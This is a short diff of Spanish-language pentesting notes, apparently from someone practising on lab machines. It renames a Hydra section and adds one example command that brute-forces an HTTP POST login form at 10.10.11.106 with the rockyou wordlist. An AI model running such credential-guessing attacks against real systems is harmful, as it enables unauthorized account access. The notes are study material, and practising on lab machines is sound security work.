@@ -24,7 +24,19 @@ function extractPorts(){
 
 ```
 
-## Hydra Proxy
+## Hydra 
+
+Ejemplos hay que practicar
+
+```
+
+ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.11.106 -s 5000 -v http-post-form "/login/:user=^USER^&password=^PASS^:Invalid Password"
+
+```
+
+basic
+
+###Proxy
 
 Para poder pasar por un proxy usa:
 
